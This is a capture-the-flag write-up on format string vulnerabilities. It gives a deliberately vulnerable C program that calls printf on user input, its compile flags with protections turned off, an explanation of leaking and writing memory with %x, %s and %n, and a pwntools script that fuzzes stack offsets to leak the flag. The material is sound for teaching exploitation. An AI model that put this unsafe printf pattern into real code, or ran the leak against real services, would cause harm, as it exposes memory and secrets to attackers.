```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("We will evaluate any format string you give us with printf().");
  
  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("flag.txt is missing!\n");
    exit(0);
  }
  
  fgets(flag, sizeof(flag), file);
  
  while(1) {
    printf("> ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }  
  return 0;
}
```

```txt
flag{foRm4t_stRinGs_aRe_DanGer0us}
```

```bash
gcc prog.c -o prog -fno-stack-protector -no-pie -m32
```

In the [[Ret2System]] challenge, it's really just proof-of-concept. In reality, we can't really do something like that against a remote server, we wouldn't really know what address `libc` is at or any of the offset of the functions in `libc`. We'd need to leak those somehow. That can be done with a buffer overflow or a format string vulnerability.

The problem in this challenge's code is the `printf(buf)`. This is because it's not specifying what type of data is being passed into the `printf` with a format specifier. We can't overflow the buffer because of `fgets`, but we can enter some format specifier into the input. If we input a bunch of `%p` or `%x`, we can actually leak hex data from the stack, which can leak data like function addresses and `libc` addresses.

The `printf` function, when not specified with extra parameters and only format specifiers, will try to get the value to print off the stack. Say we want to print the 10th element of the stack, we can input `%10$x` into the `printf`.

> Note: `%s` will treat the value on the stack as a pointer, so if the first value on the stack is `0x0` then `%s` will try to use `0x0` as the pointer, go to the address `0x0` in memory, and print out the data at that address.

What we can do is specify an address first, then use the string format specifier. The specified address will be stored on the stack, then the string format specifier will read that value, go to the address specified by that value, and try to read it: `\xef\xbe\xad\xde%s`.

> Note: We'll use `\xef\xbe\xad\xde%x%x%s` with `%x` being there if the `printf` already specified some other elements which will go on the stack after the specified address. The number of `%x` varies and depends on how many extra variables will go on the stack after the specified address has gone on the stack.

We can also control the width of the input using the `%n` format specifier. More information about different format specifier attacks can be found [here](https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/). `pwntools` also have some functionalities to exploit format vulnerabilities, which can be found [here](https://docs.pwntools.com/en/stable/fmtstr.html).

In our case, because the flag is already read and stored in stack memory, all we need to do is to continuously print out the next stack data and see if it's the flag or not. This is a python fuzzing script to exploit the executable.

```python
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./format_vuln', checksec=False)

# Fuzz 100 values on top of the stack
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
        
        # Receive the response
        result = p.recvuntil(b'> ')
        
        # Check for flag
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + str(result))
        
        # Exit the process
        p.close()
    except EOFError:
        pass
```

Even with a 64-bit binary, this script still works fine.